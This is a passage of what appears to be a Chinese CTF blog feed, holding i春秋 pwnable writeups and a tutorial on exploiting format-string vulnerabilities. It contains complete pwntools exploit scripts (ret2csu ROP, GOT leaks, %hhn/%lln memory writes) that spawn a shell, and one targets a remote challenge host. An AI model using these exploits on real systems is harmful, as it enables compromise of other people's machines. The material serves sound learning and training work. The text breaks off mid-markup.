you?\n"</span>)</span><br><span class="line">payload='A'*72</span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.recvuntil(<span class="string">"A"</span>*72)</span><br><span class="line">canary=u64(a.recv(8))-0xa</span><br><span class="line">a.recv()</span><br><span class="line"><span class="comment">#ret2csu</span></span><br><span class="line">payload='A'*72</span><br><span class="line">payload+=p64(canary)</span><br><span class="line">payload+='B'*8</span><br><span class="line">payload+=p64(0x4007EA)</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(1)</span><br><span class="line">payload+=p64(read_got)</span><br><span class="line">payload+=p64(10)</span><br><span class="line">payload+=p64(0x0000000000601060)</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(0x00000000004007D0)</span><br><span class="line">payload+='A'*56</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(0x0000000000601060)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><h4 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h4><p>程序中存在格式化串漏洞，栈溢出，整型溢出。做法有多种。</p><p>这里存在格式化串漏洞：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_400AD1</span><span class="params">(<span class="keyword">char</span> format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="keyword">char</span> formata, __int64 a8, __int64 a9)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(&amp;formata);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里有整数溢出：<br><img src="/2019/03/08/i春秋pwnable-writeup/2.png" alt=""><br>由于char是8位，则输入的字节个数超过256即可绕过</p><p>这里有栈溢出：<br><img src="/2019/03/08/i春秋pwnable-writeup/1.png" alt=""><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">sub_400A90</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;s, a1, a2);#溢出了</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里单独使用栈溢出来做。<br>完整exp如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="comment">#a=process("./pwnme")</span></span><br><span class="line">a=remote(<span class="string">"106.75.2.53"</span>,<span class="string">"10006"</span>)</span><br><span class="line">offset=40</span><br><span class="line">elf=ELF(<span class="string">"./pwnme"</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">pop_rdi_ret=0x400ed3</span><br><span class="line">length=260</span><br><span class="line">def init():</span><br><span class="line">    a.recvuntil(<span class="string">"Input your username(max lenth:40): \n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"a"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Input your password(max lenth:40): \n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"a"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    a.sendline(<span class="string">"2"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"please input new username(max lenth:20): \n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"a"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"please input new password(max lenth:20): \n"</span>)</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">payload='A'*40</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(0x400770)<span class="comment">#start_addr</span></span><br><span class="line">payload+='A'*(length-len(payload))</span><br><span class="line">a.sendline(payload)</span><br><span class="line">puts_addr=u64(a.recvuntil(<span class="string">"\n"</span>,drop=True).ljust(8,<span class="string">"\x00"</span>))</span><br><span class="line">print <span class="string">"puts_addr = "</span>+ str(hex(puts_addr))</span><br><span class="line">init()</span><br><span class="line">libc=LibcSearcher(<span class="string">"puts"</span>,puts_addr)</span><br><span class="line">system_addr=puts_addr-libc.dump(<span class="string">"puts"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh=puts_addr-libc.dump(<span class="string">"puts"</span>)+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">print hex(system_addr)</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload='A'*40</span><br><span class="line">payload+=p64(0x400eca)</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(1)</span><br><span class="line">payload+=p64(read_got)</span><br><span class="line">payload+=p64(10)</span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(0)</span><br><span class="line">payload+=p64(0x400eb0)</span><br><span class="line">payload+='A'*56</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">payload+=p64(0x400770)</span><br><span class="line">payload+='A'*(length-len(payload))</span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;easypwn&quot;&gt;&lt;a href=&quot;#easypwn&quot; class=&quot;headerlink&quot; title=&quot;easypwn&quot;&gt;&lt;/a&gt;easypwn&lt;/h4&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>格式化串漏洞利用总结</title>
    <link href="http://yoursite.com/2019/02/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/02/22/格式化串漏洞利用总结/</id>
    <published>2019-02-22T11:43:00.000Z</published>
    <updated>2019-02-26T12:26:52.217Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>这篇笔记总结下格式化字符串漏洞的利用。看之前需要对基本格式化字符串漏洞原理有所了解，在先前的笔记中已有。<br>格式化字符串漏洞的利用，往往就两点：泄露内存，修改内存。泄露内存可以泄露栈上数据，如 saved ebp/rbp , 返回地址，还有函数的got表项内容。修改内存可以修改got表项内容，返回地址，变量的值等等。还可以利用他来写ROP等。</p><h3 id="预备知识："><a href="#预备知识：" class="headerlink" title="预备知识："></a>预备知识：</h3><ol><li>%x:   他可以将对应参数的值以16进制打印出来，<strong>%x只能打印4个字节，%lx或者%llx可以打8个字节</strong>。如%x表示要泄漏对应偏移4字节长度的16进制数据，%llx表示要泄漏对应偏移8字节长度的16进制数据。</li><li>%s：可以打印<strong>对应参数所指向的字符串</strong>。</li><li>%n:  可以修改对应参数（这个参数是指针）所指向的变量的值为%n之前打印的字符的个数，如果是32位程序，则这个指针变量为4字节，64位程序这个指针变量为8字节，这是因为不同位数，地址的长度不同。<strong>还要注意%n是修改对应参数指向的地址起，4字节长度的空间。，%hn，是修改2字节的地址空间，%hhn是1字节的地址空间，%lln是修改8字节的地址空间。</strong><br><strong>像修改地址这样的大数据，如果一次输出太多的字节可能会引起程序崩溃，则可以利用%hn，%hhn来一部分一部分的写入，下面修改内存部分会讲到。</strong></li></ol><h3 id="泄露内存："><a href="#泄露内存：" class="headerlink" title="泄露内存："></a>泄露内存：</h3><h4 id="泄露got表项内容："><a href="#泄露got表项内容：" class="headerlink" title="泄露got表项内容："></a>泄露got表项内容：</h4><p>   泄露内存可以泄露程序中使用过的函数的got表项的内容，得到该函数的地址。但是在64位程序中，往往会被\x00给截断。。因为64位程序中，很多地址的高位是00，但是在32位程序中不会，这就需要将地址写在格式化串的末尾。<br>   如果已知目标程序使用的libc库，就可以计算出system函数的地址，<br>   如果题目没有给出目标程序使用的libc库，则可以多泄露几个函数的地址，通过 <a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a> 来获知目标程序使用的libc库，然后再计算出system函数的地址。也可以使用这个python的库<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a> 来获知目标程序使用的动态库，原理都是一样的：ASLR不会随机化地址的后12bit。<br>具体计算方法是:<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">libc_base</span> = 泄露函数的地址 - 其在libc库中的偏移(libc.symbols[<span class="string">"函数名"</span>])</span><br><span class="line"><span class="attr">system_address</span> = libc_base + system在库中的偏移(libc.symbols[<span class="string">"system"</span>])</span><br></pre></td></tr></table></figure></p><p> 出现格式化串漏洞的时候，程序往往是这样的：</p><pre><code>char a[50];read(0,a,50);printf(a);</code></pre><p>则你输入的字符串是保存在栈中的（后面会讨论格式化串不在栈中的情况，如在bss段或者堆中），然后你调用printf函数，此时printf函数的堆栈是在原先函数堆栈的低地址处，所以printf可以找到字符串的空间。<br>如图：<br><img src="/2019/02/22/格式化串漏洞利用总结/1.png" alt=""><br>例如可以得到这样的结果：<br><img src="/2019/02/22/格式化串漏洞利用总结/2.png" alt=""><br>可以看到AAAA在格式化串偏移7位置处。<br>如果将第七个%x，换成%s，那就将打印0x41414141这个地址指向的字符串了。很可能这不是一个有效的字符串地址，换成%s，会出现段错误。<br>如果将AAAA换成有效的字符串地址，则将字符串打印出来。</p><p>写个例子，分别讨论下32位和64位。</p><h5 id="32位程序："><a href="#32位程序：" class="headerlink" title="32位程序："></a>32位程序：</h5><p> 源代码如下：<br> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fsb</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">  read(<span class="number">0</span>,a,<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">  read(<span class="number">0</span>,a,<span class="number">0x500</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  fsb();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译时关闭了canary和pie保护：<br> <code>gcc -m32 demo.c -fno-stack-protector -no-pie -g -o demo</code><br> 这里的setbuf函数是关闭输出缓冲区，防止远程打的时候，没有输出。<br> 题目的思路如下：<br> 使用格式化串漏洞随便泄露一个函数的got表项内容，结合libc库，计算出libc的基地址，接着计算出system函数的地址。<br> 此时格式化串的构造方式为：<br> <code>payload=p32(函数got表项的地址)+ %offset$s</code><br> offset怎么计算，可以看看格式化串漏洞的基本原理。<br> 这样就可以将got表项的内容打印出来，计算出system函数的地址后，简单的rop，即可得到shell，完整exp如下：<br> <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">a=process(<span class="string">"./demo"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./demo"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">offset=7</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload=p32(read_got)+<span class="string">"%7$s"</span> <span class="comment">#格式化串</span></span><br><span class="line">a.send(payload)</span><br><span class="line">read_addr=u32(a.recv(8)[4:8]) <span class="comment">#接受read函数的地址</span></span><br><span class="line"></span><br><span class="line">system_addr=read_addr-libc.symbols[<span class="string">"read"</span>]+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">pop3ret = 0x8048619 </span><br><span class="line">payload='A'*112 <span class="comment">#padding</span></span><br><span class="line">payload+=p32(read_addr) <span class="comment">#read函数将/bin/sh读入bss段</span></span><br><span class="line">payload+=p32(pop3ret)</span><br><span class="line">payload+=p32(0)</span><br><span class="line">payload+=p32(elf.bss())</span><br><span class="line">payload+=p32(10)</span><br><span class="line">payload+=p32(system_addr)</span><br><span class="line">payload+=p32(pop3ret)</span><br><span class="line">payload+=p32(elf.bss())</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/22/格式化串漏洞利用总结/3.png" alt=""></p><h5 id="64位程序："><a href="#64位程序：" class="headerlink" title="64位程序："></a>64位程序：</h5><p>和32位程序的代码是一样的。编译时去掉了-m32选项。</p><p>64位参数的传递和32位有所不同，由于64位cpu寄存器很多，所以前6个参数通过寄存器传递，从函数名开始的第一个参数到第六个参数依次放在rdi,rsi,rdx,rcx,r8,r9，多余6个的参数，从右往左依次入栈。<br>由于64位程序的地址，很多高位是0，这样就会导致，格式化串被\x00截断,例如：<br><img src="/2019/02/22/格式化串漏洞利用总结/4.png" alt=""><br>拿read函数的got举例：<br><code>p64(read_got)=&quot;\x30\x10\x60\x00\x00\x00\x00\x00&quot;</code><br>由于字符串是以\x00结尾的，所以会被截断，但是将其放在字符串的末尾就可以解决了：<br><code>payload=&#39;A&#39;*(???) + &#39;%&#39; + str(offset+????) + &quot;$s&quot; + p64(read_got)</code><br>要注意将地址写在8字节对齐处。<br>payload前面的AAA..是为了将p64(read_got)写在8字节对齐处，至于要写多少个A，就按具体情况计算了。<br>完整的脚本如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line">a=process(<span class="string">"./demo64"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./demo64"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">offset=6</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload=<span class="string">"AAAA%7$s"</span>+p64(read_got)<span class="comment">#本例中是4个A</span></span><br><span class="line">a.sendline(payload)</span><br><span class="line">read_addr=u64(a.recvuntil(<span class="string">"\x30"</span>,drop=True)[4:].ljust(8,'\x00'))</span><br><span class="line">print <span class="string">"read_addr = "</span>+str(hex(read_addr))</span><br><span class="line"></span><br><span class="line">system_addr=read_addr-libc.symbols[<span class="string">"read"</span>]+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">print <span class="string">"system_addr = "</span>+str(hex(system_addr))</span><br><span class="line">pop_rdi_ret=0x400753 <span class="comment">#ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ret2csu </span></span><br><span class="line">payload='A'*120 <span class="comment">#padding</span></span><br><span class="line">payload+=p64(0x40074A)<span class="comment">#csu_init </span></span><br><span class="line">payload+=p64(0)<span class="comment">#rbx=0</span></span><br><span class="line">payload+=p64(1)<span class="comment">#rbp=1</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r12 </span></span><br><span class="line">payload+=p64(0)<span class="comment">#arg3 -&gt; fd</span></span><br><span class="line">payload+=p64(elf.bss())<span class="comment">#arg2 -&gt; buf</span></span><br><span class="line">payload+=p64(7)<span class="comment">#arg1 -&gt; length</span></span><br><span class="line">payload+=p64(0x400730)<span class="comment">#csu_init</span></span><br><span class="line">payload+='A'*56 <span class="comment">#padding</span></span><br><span class="line">payload+=p64(pop_rdi_ret)<span class="comment">#return address</span></span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/22/格式化串漏洞利用总结/5.png" alt=""></p><h3 id="修改内存："><a href="#修改内存：" class="headerlink" title="修改内存："></a>修改内存：</h3><p>   修改内存往往是修改函数的GOT表项，例如修改为system函数的地址，则调用被修改got表的函数就会调用system函数。结合下面的小例子来看一下：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){  setbuf(stdout,0);  while(1)  {    char b[100];    gets(b);    printf(b);  }  return 0;}</code></pre><p>   编译时关闭了canary保护和PIE保护。<br>   这个例子的利用思路就是先使用printf函数泄露某个函数的地址，然后结合libc库，计算出system函数的地址。第二次利用printf函数修改printf函数的got表项内容为system函数的地址，再输入字符串/bin/sh\x00，则再次调用printf函数时，其实会调用system(“/bin/sh”)，这样就可以拿到shell了。下面分32位程序和64位程序：</p><h5 id="32位程序：-1"><a href="#32位程序：-1" class="headerlink" title="32位程序："></a>32位程序：</h5><p>   32位程序不会有被地址截断的情况，则格式化串比较好写。<br>   可以用%hhn一个字节一个字节写，这样打印的字符就会很少，不至于程序崩溃，当然也可以用%hn两个字节两个字节写入。<br>   一个字节写入的模板如下：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p<span class="number">32</span><span class="comment">(target)</span>+p<span class="number">32</span><span class="comment">(target+1)</span>+p<span class="number">32</span><span class="comment">(target+2)</span>+p<span class="number">32</span><span class="comment">(target+3)</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length1)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset)</span>+<span class="string">"$hhn"</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length2)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset+1)</span>+<span class="string">"$hhn"</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length3)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset+2)</span>+<span class="string">"$hhn"</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length4)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset+3)</span>+<span class="string">"$hhn"</span></span><br></pre></td></tr></table></figure></p><p>pwntools这个库有了现成的函数fmtstr_payload，可以生成修改内存的格式化串,但是这个只适用于32位的，原因是这个函数生成的payload和上面写的模板是一样的，64位的程序，地址会有00，这个payload会被截断。<br>   完整的利用脚本如下：</p><pre><code>#!/usr/bin/env pythonfrom pwn import *context.log_level=&quot;debug&quot;a=process(&quot;./fsb&quot;)elf=ELF(&quot;./fsb&quot;)libc=ELF(&quot;./libc.so.6&quot;)printf_got=elf.got[&quot;printf&quot;]def leak(addr):    payload=p32(addr)    payload+=&quot;%7$s&quot;    a.sendline(payload)    data=a.recv(8)[4:8]    return datadef get(target,printed):    if printed&gt;target:        return (256-printed+target)    elif printed==target:        return 0    else:         return target-printeddef modify(target,offset,old):    t1=target&amp;0xff    t2=target&gt;&gt;8&amp;0xff    t3=target&gt;&gt;16&amp;0xff    t4=target&gt;&gt;24&amp;0xff    payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)    len1=get(t1,len(payload))    len2=get(t2,(len1)+16)    len3=get(t3,(len2+len1)+16)    len4=get(t4,(len3+len2+len1)+16)    payload+=&apos;%&apos;+str(len1)+&apos;c&apos;+&apos;%&apos;+str(offset)+&apos;$hhn&apos;    payload+=&apos;%&apos;+str(len2)+&apos;c&apos;+&apos;%&apos;+str(offset+1)+&apos;$hhn&apos;    payload+=&apos;%&apos;+str(len3)+&apos;c&apos;+&apos;%&apos;+str(offset+2)+&apos;$hhn&apos;    payload+=&apos;%&apos;+str(len4)+&apos;c&apos;+&apos;%&apos;+str(offset+3)+&apos;$hhn&apos;    return payloadprintf_addr=u32(leak(printf_got))system_addr=printf_addr-libc.symbols[&quot;printf&quot;]+libc.symbols[&quot;system&quot;]payload=modify(system_addr,7,printf_got)a.sendline(payload) sleep(0.1)a.sendline(&quot;/bin/sh\x00&quot;)a.interactive()</code></pre><p>解释下脚本：</p><pre><code>payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)</code></pre><p>这里是先将要修改的got表项的地址写入栈中，然后利用找到的偏移来一个字节一个字节的修改</p><pre><code>def get(target,printed):        if printed&gt;target:            return (0x100-printed+target)        elif printed==target:            return 0        else:             return target-printed</code></pre><p>get函数是用来计算要打印多少字节的。如果前面覆盖字节所需打印的字符的个数超过了后面要打印字符的个数，则可以通过溢出来调整，例如你想要写入\x00，则你可以打印0x100个字符，因为只能写入一个字节长度，所以高位字节会被截断，只留下\x00。</p><h5 id="64位程序：-1"><a href="#64位程序：-1" class="headerlink" title="64位程序："></a>64位程序：</h5><p>64位程序用这道题做示范：ASIS CTF 2017 Mary Morton</p><p>网上的writeup都是使用现成的工具formatStringExploiter来攻击的。<br>还有的writeup是通过泄露canary，利用栈溢出写rop利用的。这次通过手动利用格式化串漏洞来攻击。<br>64位程序，修改内存，就不能像上面32位那样分开一点一点写了，只能利用%lln一次写完。当然，如果目标内存，只需要修改2个字节或者4字节，就可以使用%hn，%n。<br>格式化串的模板如下：<br><code>payload=&#39;a&#39;*(???)+&#39;%&#39;+str(length)+&#39;c&#39;+&#39;%&#39;+str(offset+????)+&quot;$lln&quot;+p64(目标地址)</code><br>payload前面的 ‘a’ 是考虑到字节对齐的问题，要将目标地址写在8字节对齐处。offset要加多少，也是根据具体情况。<br>题目的main函数如下：<br><img src="/2019/02/22/格式化串漏洞利用总结/6.png" alt=""><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">fsb</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);<span class="meta">#canary</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);#格式化串漏洞</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">stackoverflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);<span class="meta">#canary</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);#栈溢出</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"-&gt; %s\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序中给了后门函数,但是没有shell。<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 